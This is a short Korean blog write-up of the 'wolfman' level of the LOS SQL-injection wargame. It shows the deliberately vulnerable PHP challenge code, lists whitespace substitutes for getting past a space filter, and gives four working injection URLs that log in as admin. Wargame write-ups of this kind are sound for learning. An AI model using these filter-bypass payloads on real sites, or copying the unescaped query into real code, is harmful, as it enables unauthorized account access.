---
layout: post
title: ! "[LOS] wolfman"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - LOS
  - Web-hacking
  - wolfman
  - write-up
---
![]({{ site.baseurl }}/assets/posts/los/wolfman.png)

`query: select id from prob_wolfman where id='guest' and pw=''`

```php
<?php 

  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```
공백 필터링이 있는 문제다.
저번처럼 id는 guest로 고정되어있고 id는 admin이 되어야 문제가 풀린다.

공백이 필터링 되어있을 때 대신할 수 있는 것은
```
1. TAB :  %09
2. \n : %0a
3. \r : %0d
4. 주석 : /**/
5. 괄호 : ()
6. +
```

등등이 있는데
이 문제에선 괄호가 안먹힌다.
그래서 TAB,\n,\r,주석의 경우를 다 테스트 해봤다.

```
TAB : ?pw=%27%09or%09id=%27admin
\n : ?pw=%27%0aor%0aid=%27admin
\r : ?pw=%27%0dor%0did=%27admin
주석 : ?pw=%27/**/or/**/id=%27admin
```

다양한 시도를 해서 푼 화면이다.
![]({{ site.baseurl }}/assets/posts/los/wolfman_clear1.png)
![]({{ site.baseurl }}/assets/posts/los/wolfman_clear2.png)


울프맨 클리어!
